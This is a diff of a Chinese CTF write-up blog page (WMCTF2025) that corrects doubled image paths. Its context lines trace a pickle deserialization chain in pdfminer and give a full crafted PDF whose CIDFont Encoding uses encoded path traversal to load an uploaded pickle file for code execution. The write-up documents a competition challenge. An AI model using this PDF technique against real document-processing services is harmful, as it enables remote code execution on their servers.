@@ -26,21 +26,21 @@
 <meta property="og:site_name" content="onehang&#39;s blogs">
 <meta property="og:description" content="前言本题的功能点是一个将pdf转换为txt的网站，修复方式是把pickle换成了marshal 分析调用链这题考察pickle反序列化，首先在pdfminer库里搜索pickle.loads 1234567891011121314151617def _load_data(cls, name: str) -&gt; Any:    name &#x3D; name.replace(&quot;\0&quot;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923130848407.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131155099.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131249192.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131416719.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131448101.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131557145.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131620302.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131635382.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131648622.png">
-<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923132114656.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923130848407.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923131155099.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923131249192.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923131416719.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923131448101.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923131557145.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923131620302.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923131635382.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923131648622.png">
+<meta property="og:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923132114656.png">
 <meta property="article:published_time" content="2025-09-23T08:05:26.000Z">
 <meta property="article:modified_time" content="2025-09-23T08:30:19.725Z">
 <meta property="article:author" content="onehang">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923130848407.png">
+<meta name="twitter:image" content="http://example.com/2025/09/23/WMCTF2025/image-20250923130848407.png">
   
   
   
@@ -292,23 +292,23 @@
 
 <p>这里反序列化的数据是默认的cmap目录下的文件，如果能让他变成我们可控的文件就能够实现rce</p>
 <p>注意到path里面的filename是我们可控的，如果能目录穿越到我们可控的目录就可以了，往上寻找看看是从哪里调用过来的</p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923130848407.png" srcset="/img/loading.gif" lazyload alt="image-20250923130848407"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923130848407.png" srcset="/img/loading.gif" lazyload alt="image-20250923130848407"></p>
 <p>发现有两个地方调用了_load_data函数，但是get_unicode_map 调用的时候前缀是写死的无法进行目录穿越</p>
 <p>所以只能是get_cmap,继续看</p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131155099.png" srcset="/img/loading.gif" lazyload alt="image-20250923131155099"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923131155099.png" srcset="/img/loading.gif" lazyload alt="image-20250923131155099"></p>
 <p>找到这里，再继续看get_cmap_from_spec</p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131249192.png" srcset="/img/loading.gif" lazyload alt="image-20250923131249192"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923131249192.png" srcset="/img/loading.gif" lazyload alt="image-20250923131249192"></p>
 <p>是PDFCIDFont类初始化的时候调用的，继续看</p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131416719.png" srcset="/img/loading.gif" lazyload alt="image-20250923131416719"></p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131448101.png" srcset="/img/loading.gif" lazyload alt="image-20250923131448101"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923131416719.png" srcset="/img/loading.gif" lazyload alt="image-20250923131416719"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923131448101.png" srcset="/img/loading.gif" lazyload alt="image-20250923131448101"></p>
 <p>其实到这里已经很明显了，就是在处理CIDFont字体的时候调用的，但是还是继续看完</p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131557145.png" srcset="/img/loading.gif" lazyload alt="image-20250923131557145"></p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131620302.png" srcset="/img/loading.gif" lazyload alt="image-20250923131620302"></p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131635382.png" srcset="/img/loading.gif" lazyload alt="image-20250923131635382"></p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923131648622.png" srcset="/img/loading.gif" lazyload alt="image-20250923131648622"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923131557145.png" srcset="/img/loading.gif" lazyload alt="image-20250923131557145"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923131620302.png" srcset="/img/loading.gif" lazyload alt="image-20250923131620302"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923131635382.png" srcset="/img/loading.gif" lazyload alt="image-20250923131635382"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923131648622.png" srcset="/img/loading.gif" lazyload alt="image-20250923131648622"></p>
 <p>找到了入口函数extract_pages</p>
 <p>那么整个过程就清晰了，就是当一页pdf里面存在CIDFont字体的时候就会实例化一个PDFCIDFont对象来处理，最后调到了pcikle.loads</p>
-<p><img src="/2025/09/23/WMCTF2025//2025/09/23/WMCTF2025/image-20250923132114656.png" srcset="/img/loading.gif" lazyload alt="image-20250923132114656"></p>
+<p><img src="/2025/09/23/WMCTF2025/image-20250923132114656.png" srcset="/img/loading.gif" lazyload alt="image-20250923132114656"></p>
 <p>这个函数中可以看到，name是通过Encoding获取的，所以我们只要在pdf中插入一个CIDFont字体并且指定Encoding就可以反序列化我们可控的文件</p>
 <h1 id="构造恶意文件"><a href="/2025/09/23/WMCTF2025/#构造恶意文件" class="headerlink" title="构造恶意文件"></a>构造恶意文件</h1><p>pdf直接让ai生成就行了，再自己改一下Encoding  （帮我生成一个简单的pdf文件，声明CIDFont字体，以纯文本形式输出）</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">%PDF-1.4<br>1 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Catalog</span><br>  <span class="hljs-string">/Pages</span> 2 0 R<br>&gt;&gt;<br>endobj<br><br>2 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Pages</span><br>  <span class="hljs-string">/Count</span> 1<br>  <span class="hljs-string">/Kids</span> [3 0 R]<br>&gt;&gt;<br>endobj<br><br>3 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Page</span><br>  <span class="hljs-string">/Parent</span> 2 0 R<br>  <span class="hljs-string">/MediaBox</span> [0 0 595 842]<br>  <span class="hljs-string">/Resources</span> &lt;&lt;<br>    <span class="hljs-string">/Font</span> &lt;&lt;<br>      <span class="hljs-string">/F1</span> 4 0 R<br>    &gt;&gt;<br>  &gt;&gt;<br>  <span class="hljs-string">/Contents</span> 5 0 R<br>&gt;&gt;<br>endobj<br><br>4 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Font</span><br>  <span class="hljs-string">/Subtype</span> <span class="hljs-string">/Type0</span><br>  <span class="hljs-string">/BaseFont</span> <span class="hljs-string">/Adobe-GB1</span><br>  <span class="hljs-string">/Encoding</span> <span class="hljs-string">/..</span><span class="hljs-comment">#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Fpickle</span><br>  <span class="hljs-string">/DescendantFonts</span> [6 0 R]<br>&gt;&gt;<br>endobj<br><br>6 0 obj<br>&lt;&lt;<br>  <span class="hljs-string">/Type</span> <span class="hljs-string">/Font</span><br>  <span class="hljs-string">/Subtype</span> <span class="hljs-string">/CIDFontType0</span><br>  <span class="hljs-string">/BaseFont</span> <span class="hljs-string">/Adobe-GB1</span><br>  <span class="hljs-string">/CIDSystemInfo</span> &lt;&lt;<br>    <span class="hljs-string">/Registry</span> <span class="hljs-params">(Adobe)</span><br>    <span class="hljs-string">/Ordering</span> <span class="hljs-params">(GB1)</span><br>    <span class="hljs-string">/Supplement</span> 0<br>  &gt;&gt;<br>&gt;&gt;<br>endobj<br><br>5 0 obj<br>&lt;&lt; <span class="hljs-string">/Length</span> 32 &gt;&gt;<br>stream<br>BT<br><span class="hljs-string">/F1</span> 24 Tf<br>100 700 Td<br><span class="hljs-params">(A)</span> Tj<br>ET<br>endstream<br>endobj<br><br>xref<br>0 7<br>0000000000 65535 f<br>0000000010 00000 n<br>0000000058 00000 n<br>0000000115 00000 n<br>0000000252 00000 n<br>0000000375 00000 n<br>0000000534 00000 n<br>trailer<br>&lt;&lt;<br>  <span class="hljs-string">/Root</span> 1 0 R<br>  <span class="hljs-string">/Size</span> 7<br>&gt;&gt;<br>startxref<br>620<br>%%EOF<br><br></code></pre></td></tr></table></figure>
